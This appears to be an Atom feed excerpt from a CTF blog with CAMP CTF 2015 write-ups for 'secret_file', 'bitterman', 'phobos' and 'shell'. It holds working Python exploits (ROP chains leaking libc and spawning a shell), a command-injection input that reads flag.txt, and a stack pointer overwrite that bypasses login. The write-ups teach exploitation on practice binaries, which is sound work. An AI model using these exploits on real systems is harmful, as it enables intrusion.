gdb-peda$ c
AAAA

...

=&gt; 0x555555554bd5:  call   0x555555554a80 &lt;strcmp@plt&gt;
   0x555555554bda:  mov    r12d,eax
   0x555555554bdd:  test   eax,eax
   0x555555554bdf:  jne    0x555555554c40
   0x555555554be1:  lea    rdi,[r13+0x100]
Guessed arguments:
arg[0]: 0x7fffffffe2ab ("9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127")
arg[1]: 0x7fffffffe30c ("003daa08bd98e706782e059cbadf83277b5296645a98dfb636131e32cd7f131d")
</code></pre>

<p>OK, so it will compare the SHA256 hash of our input with the one stored on the stack. The nice thing, however, is that it will only hash the first 0x100 bytes! This means we can predict the hash we get:</p>

<pre><code>gdb-peda$ r
warning: the debug information found in "/lib64/ld-2.13.so" does not match "/lib64/ld-linux-x86-64.so.2" (CRC mismatch).

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

...

   0x555555554bc5:  jne    0x555555554ba0
   0x555555554bc7:  lea    rsi,[r13+0x17c]
   0x555555554bce:  lea    rdi,[r13+0x11b]
=&gt; 0x555555554bd5:  call   0x555555554a80 &lt;strcmp@plt&gt;

...

Guessed arguments:
arg[0]: 0x7fffffffe2ab ("9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127")
arg[1]: 0x7fffffffe30c ("e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb")

...

Breakpoint 2, 0x0000555555554bd5 in ?? ()
</code></pre>

<p>And if we do it again, but send 512 * &lsquo;A&rsquo;:</p>

<pre><code>gdb-peda$ r
warning: the debug information found in "/lib64/ld-2.13.so" does not match "/lib64/ld-linux-x86-64.so.2" (CRC mismatch).

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

...

=&gt; 0x555555554bd5:  call   0x555555554a80 &lt;strcmp@plt&gt;
   0x555555554bda:  mov    r12d,eax
   0x555555554bdd:  test   eax,eax
   0x555555554bdf:  jne    0x555555554c40
   0x555555554be1:  lea    rdi,[r13+0x100]
Guessed arguments:
arg[0]: 0x7fffffffe2ab ('A' &lt;repeats 65 times&gt;"\340, u\362\365\034\255#\320Sq\206\317\315P\371\021\352\225O\234.2\244\067\364S'\361\267\211\233\273e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb")
arg[1]: 0x7fffffffe30c ("e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb")
</code></pre>

<p>We&rsquo;ve overwritten part of the hash on the stack, yet the hash of our input stayed the same. After some trial &amp; error, I could reliably overwrite the hash:</p>

<pre><code class="bash">bas@tritonal:~/bin/ccc/secret_file$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb' | ./secret_file 
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb: not found
</code></pre>

<p>What&rsquo;s left now is to exploit it to grab the flag:</p>

<pre><code class="bash">bas@tritonal:~$ nc challs.campctf.ccc.ac 10105
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/cat flag.txt       ; #e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb
CAMP15_82da7965eb0a3ee1fb4d5d0d8804cc409ad04a4f5e06be2f2bbdbf1c0cd638a7
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CAMP CTF - Bitterman &amp; Phobos]]></title>
    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-bitterman-and-phobos/"/>
    <updated>2015-08-18T21:32:18+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-bitterman-and-phobos</id>
    <content type="html"><![CDATA[<p>I rolled into the CampCTF while Swappage was already working on it. He had started on bitterman, a 400 point challenge.</p>

<!--more-->


<p>We&rsquo;re given a 64-bit ELF binary and Swappage also managed to obtain the corresponding libc. Upon starting the binary, we&rsquo;re presented with the following:</p>

<pre><code class="bash">&gt; What's your name? 
BBBB
Hi, BBBB
x
&gt; Please input the length of your message: 
-1  
&gt; Please enter your text: 
LSJFLSDJF
&gt; Thanks!
</code></pre>

<p>The <code>x</code> after the <code>BBBB</code> in the above example was actually <code>0x7f</code>, so the binary is leaking part of an address (we later determined it to be a stack address). In the end, I couldn&rsquo;t make use of this, but it was interesting to see. Swappage already found the bugs: we can send a large message length and this will allow us to overflow a stack buffer. NX is enabled so it&rsquo;s ROP time!</p>

<p>Besides NX, ASLR is also enabled. This means we have to first leak a libc address to calculate libc&rsquo;s base address and then something like <code>system()</code>. I made use of the <code>puts@plt</code> to write out the contents of <code>puts@got</code>. The latter contains the libc address of <code>puts()</code>, which we can then receive. Superkojiman was able to find the one-shot RCE gadget. The ROP chain goes to <code>read@plt</code> and awaits our input. Upon receiving the address of the one-shot RCE gadget in libc, the ROP chain overwrites <code>puts@got</code> and restarts the binary from <code>main()</code>. This latter decision was based on using <code>system()</code> instead of the one-shot RCE gadget, but by the time I was done implementing the ROP chain, superkojiman had already supplied the offset. When <code>main()</code> restarts, one of the first functions it calls is <code>puts@plt</code>, which is now pointing to the shell-spawning one-shot RCE gadget. We land a shell and are happy!</p>

<pre><code class="python">#!/usr/bin/python
import struct, time
from socket import *

def q(x):
    return struct.pack("&lt;Q", x)

def readtil(delim):
  buf = b''
  while not delim in buf:
      buf += s.recv(1)
  return buf

payload = "A"*152   # ty Swappage!

'''
0x000002bc : pop r12; pop r13; pop r14; pop r15; ret
0x00000296 : xor ebx, ebx; nop [rax + rax]; mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
0x00000060 : pop rbp; ret
'''

base = 0x400590
# prologue, needed for later! after the [call r12 + rbx*8], there is
# a cmp rbx, rbp. At this point, rbx is 1 and if rbp is not equal to rbx, 
# the code jumps back instead of leading to a ret!
# therefore, we set up rbp first. 
payload += q(0x00000060+base)   # pop rbp ; ret
payload += q(1) # value for rbp

# first, we set up some registers, which will later be put in the correct registers
# puts() uses rdi as argument
payload += q(0x000002bc+base)
payload += q(0x600c50)  # value for r12 -&gt; puts@got
payload += q(0)         # value for r13 -&gt; goes into rdx 
payload += q(0)         # value for r14 -&gt; goes into rsi
payload += q(0x600c50)  # value for r15 -&gt; goes into rdi -&gt; leak addr of puts()

# swap around the registers and call puts()
payload += q(0x00000296+base)
payload += q(0) * 7
# without this, we don't get output
payload += q(0x400570)  # fflush@plt

# now read() to overwrite printf()
# read() is blocking and will wait for our input :)
# again, first set up rbp
payload += q(0x00000060+base)   # pop rbp ; ret
payload += q(1) # value for rbp

# set up registers/arguments for read()
payload += q(0x000002bc+base)
payload += q(0x600c60)  # value for r12 -&gt; read@got
payload += q(8)         # value for r13 -&gt; goes into rdx -&gt; count
payload += q(0x600c50)  # value for r14 -&gt; goes into rsi -&gt; overwrite puts@got
payload += q(0)         # value for r15 -&gt; goes into rdi -&gt; 0 -&gt; stdin

payload += q(0x00000296+base)
payload += q(0) * 7

# restart main(), so the binary will execute puts() -&gt; one shot rce, lands a shell
# could've just a easily return to puts@plt...
payload += q(0x4006ec) 

def pwn():
    global s
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('challs.campctf.ccc.ac', 10103))

    readtil('name?')
    s.send('a\n')
    readtil('message:')
    s.send('-1\n')   # ty Swappage!
    readtil('text:')
    s.send(payload+'\n')

    readtil('Thanks!\n')
    data = s.recv(8)
    data = data[:-1] + "\x00\x00"
    puts_addr = struct.unpack('&lt;Q', data)[0]
    print "[+] Leaked puts(): " + hex(struct.unpack('&lt;Q', data)[0])

    libc_base = puts_addr - 0x70a30
    print "[+] libc base addr: " + hex(libc_base)
    system_addr = libc_base + 0x442AA # one shot rce, ty superkojiman!
    print "[+] sending one shot rce addr (" + hex(system_addr) + ")"

    # the rop chain will wait at read(), because that is blocking
    # send the address to overwrite puts@got
    s.send(q(system_addr))

    import telnetlib
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
pwn()
</code></pre>

<p>The reason for setting up <code>rbp</code>:</p>

<pre><code>  400839:   call   QWORD PTR [r12+rbx*8]
  40083d:   add    rbx,0x1
  400841:   cmp    rbx,rbp  ; if rbx != rbp, we jump back!
  400844:   jne    400830 
  400846:   add    rsp,0x8  ; we wanna go here!
  40084a:   pop    rbx
  40084b:   pop    rbp
  40084c:   pop    r12
  40084e:   pop    r13
  400850:   pop    r14
  400852:   pop    r15
  400854:   ret    
</code></pre>

<p>And the exploit in action:</p>

<pre><code class="bash">[+] Leaked puts(): 0x7fb9d6487a30
[+] libc base addr: 0x7fb9d6417000
[+] sending one shot rce addr (0x7fb9d645b2aa)
id
uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
whoami
challenge
ls -alh
total 40K
drwxr-xr-x 2 root root 4.0K Aug 13 13:46 .
drwxr-xr-x 3 root root 4.0K Aug  5 21:43 ..
-rw-r--r-- 1 root root  220 Aug  5 19:55 .bash_logout
-rw-r--r-- 1 root root 3.7K Aug  5 19:55 .bashrc
-rw-r--r-- 1 root root  675 Aug  5 19:55 .profile
-rwxr-xr-x 1 root root  11K Aug 12 01:28 bitterman
-rw-r--r-- 1 root root   43 Aug 13 13:47 flag.txt
-rwxr-xr-x 1 root root   64 Aug 12 01:34 run.sh
cat flag.txt
CAMP15_a786be6aca70bfd19b6af86133991f80  -
</code></pre>

<h2>Phobos</h2>

<p>Next, we turned to phobos for 300 points, which is nearly the same binary but without NX! After a few small changes to the previous exploit, we obtained the flag for phobos as well:</p>

<pre><code class="python">#!/usr/bin/python
import struct, time
from socket import *

def q(x):
    return struct.pack("&lt;Q", x)

def readtil(delim):
  buf = b''
  while not delim in buf:
      buf += s.recv(1)
  return buf

payload = "A"*136   # ty Swappage!

'''
0x000002bc : pop r12; pop r13; pop r14; pop r15; ret
0x000002b6 : xor ebx, ebx; nop [rax + rax]; mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
0x00000060 : pop rbp; ret
'''

base = 0x400590
# prologue, needed for later!
payload += q(0x00000060+base)   # pop rbp ; ret
payload += q(1) # value for rbp

payload += q(0x000002dc+base)
payload += q(0x600c70)  # value for r12 -&gt; puts@got
payload += q(0)         # value for r13 -&gt; goes into rdx 
payload += q(0)         # value for r14 -&gt; goes into rsi
payload += q(0x600c70)  # value for r15 -&gt; goes into rdi -&gt; leak addr of puts()

payload += q(0x000002b6+base)
payload += q(0) * 7
payload += q(0x400570)  # fflush@plt

# now read() to overwrite printf()
payload += q(0x00000060+base)   # pop rbp ; ret
payload += q(1) # value for rbp

payload += q(0x000002dc+base)
payload += q(0x600c80)  # value for r12 -&gt; read@got
payload += q(8)         # value for r13 -&gt; goes into rdx -&gt; count
payload += q(0x600c70)  # value for r14 -&gt; goes into rsi -&gt; overwrite printf()
payload += q(0)         # value for r15 -&gt; goes into rdi -&gt; 0 -&gt; stdin

payload += q(0x000002b6+base)
payload += q(0) * 7

payload += q(0x4006ec) # restart, so the binary will execute puts() -&gt; one shot rce, lands a shell

def pwn():
    global s
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('challs.campctf.ccc.ac', 10106))
    #s.connect(('localhost', 4444))

    print readtil('name?')
    s.send('a\n')
    print readtil('message:')
    s.send('-1\n')   # ty Swappage!
    print readtil('text:')
    s.send(payload+'\n')
    print readtil('Thanks!\n')

    data = s.recv(8)
    data = data[:-1] + "\x00\x00"

    puts_addr = struct.unpack('&lt;Q', data)[0]
    print "[+] Leaked puts(): " + hex(struct.unpack('&lt;Q', data)[0])
    libc_base = puts_addr - 0x70a30
    print "[+] libc base addr: " + hex(libc_base)
    system_addr = libc_base + 0x442AA # one shot rce, ty superkojiman!
    print "[+] sending one shot rce addr (" + hex(system_addr) + ")"

    s.send(q(system_addr))

    import telnetlib
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
pwn()
</code></pre>

<p>And in action:</p>

<pre><code class="bash">bas@tritonal:~/bin/ccc/phobos$ python poc2.py 
&gt; What's your name?

Hi, a
&lt;randomjunk&gt;
&gt; Please input the length of your message:

&gt; Please enter your text:

&gt; Thanks!

[+] Leaked puts(): 0x7fa6830dda30
[+] libc base addr: 0x7fa68306d000
[+] sending one shot rce addr (0x7fa6830b12aa)
id
uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
cat flag.txt
CAMP15_0ae754f04a8782cba9a7ec2c69dc1274
</code></pre>

<p>It&rsquo;s quite nice to solve a 400 point challenge only to find out we can use nearly the same solution for an additional 300 points!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CAMP CTF - Shell]]></title>
    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-shell/"/>
    <updated>2015-08-18T21:30:07+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-shell</id>
    <content type="html"><![CDATA[<p>shell was a pwnable from CAMP CTF. We&rsquo;re given a 64-bit ELF binary, which shows the following when executed:</p>

<!--more-->


<pre><code class="bash">bas@tritonal:~/bin/ccc/shell$ ./shell
$ help
sh whoami date exit ls help hlep login
$ sh
Permission denied
$ login
Username: AAAA
Password: BBBB
Authentication failed!
$ 
</code></pre>

<p>Furthermore, the output of <code>strings ./shell</code> shows that the binary is looking for <code>creds.txt</code>. I placed a file in the same directory with <code>admin:admin</code> as sole line and indeed, I could now login:</p>

<pre><code class="bash">$ login
Username: admin
Password: admin
Authenticated!
# sh
$
</code></pre>

<p>So we&rsquo;ll need to login with valid credentials, which we do not have yet. The rest of the commands are not of interest. Let&rsquo;s have a look at the disassembly, specifically at the part where our input is processed:</p>

<pre><code>  400c2a:   movabs rdi,0x400f89
  400c34:   mov    al,0x0
  400c36:   call   400750 &lt;printf@plt&gt;
  ; this is the buffer it's using
  400c3b:   lea    rdi,[rbp-0x80]               
  400c3f:   add    rdi,0x4
  400c46:   mov    DWORD PTR [rbp-0xd0],eax
  400c4c:   mov    al,0x0
  ; here we get the username
  400c4e:   call   400790 &lt;gets@plt&gt;
  400c53:   movabs rdi,0x400f94
  400c5d:   mov    DWORD PTR [rbp-0xd4],eax
  400c63:   mov    al,0x0
  400c65:   call   400750 &lt;printf@plt&gt;
  ; this is the buffer for password
  400c6a:   lea    rdi,[rbp-0x80]
  400c6e:   add    rdi,0x24
  400c75:   mov    DWORD PTR [rbp-0xd8],eax
  400c7b:   mov    al,0x0
  400c7d:   call   400790 &lt;gets@plt&gt;
  400c82:   movabs rsi,0x400f9f
  ; i suppose I can overwrite this value
  400c8c:   mov    rdi,QWORD PTR [rbp-0x18]     ; creds.txt
  400c90:   mov    DWORD PTR [rbp-0xdc],eax
  400c96:   call   4007b0 &lt;fopen@plt&gt;
</code></pre>

<p>So basically, the calls to <code>gets()</code> happen to write to the stack. We&rsquo;re not able to overwrite the saved return address because of the canary, but we can overwrite the pointer at <code>[rbp-0x18]</code>, which contains a pointer to the string <code>creds.txt</code>. We can overwrite this with a pointer to another string, to make the binary open another file to check our credentials!</p>

<p>The only option that I could find was <code>/lib64/ld-linux-x86-64.so.2</code>. The problem is, does this actually contain valid pairs of <code>user:name</code>? I grabbed the file via a shell I obtained on bitterman and ran it through strings:</p>

<pre><code>bas@tritonal:~/bin/ccc/shell$ strings ./ld.so |grep ":"
|F:m
&lt;:uR
sHu:H9
...snip...
FATAL: kernel too old
Unused direct dependencies:
    Version information:
    %s:
prelink checking: %s
wrong ELF class: ELFCLASS32
undefined symbol: 
relocation processing: %s%s
...snip...
</code></pre>

<p>Indeed, it does! So the plan is to overwrite the pointer on the stack with the pointer to <code>/lib64/ld-linux-x86-64.so.2</code>, then login with one of those combinations of &ldquo;username&rdquo; and &ldquo;password&rdquo;. The exploit:</p>

<pre><code class="python">#!/usr/bin/python
import struct, time
from socket import *

def q(x):
    return struct.pack("&lt;Q", x)

def readtil(delim):
  buf = b''
  while not delim in buf:
      buf += s.recv(1)
  return buf

def pwn():
    global s
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('challs.campctf.ccc.ac', 10117))

    readtil('$')
    s.send('login\n')
    readtil('Username:')
    s.send('AAAA\n')
    readtil('Password:')
    # overwrite rbp-0x18, which used to contain a pointer to "creds.txt"
    # overwrite it with a pointer to 0x400200 ("/lib64/ld-linux-x86-64.so.2")
    # I harvested this file already via one of the other challenges
    s.send("A"*68+q(0x400200)+'\n')

    readtil('$')
    s.send('login\n')
    readtil('Username:')
    s.send('relocation processing\n')
    readtil('Password:')
    s.send(' %s%s\n')

    import telnetlib
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
pwn()
</code></pre>

<p>And it action:</p>

<pre><code class="bash">bas@tritonal:~/bin/ccc/shell$ python ./poc.py 
 Authenticated!
# id
Command not found
# sh
ls
creds.txt
flag.txt
run.sh
shell
cat flag.txt
CAMP15_408eed038796cfca32e2fdb3a8126429
</code></pre>
]]></content>
  </entry>
  
</feed>
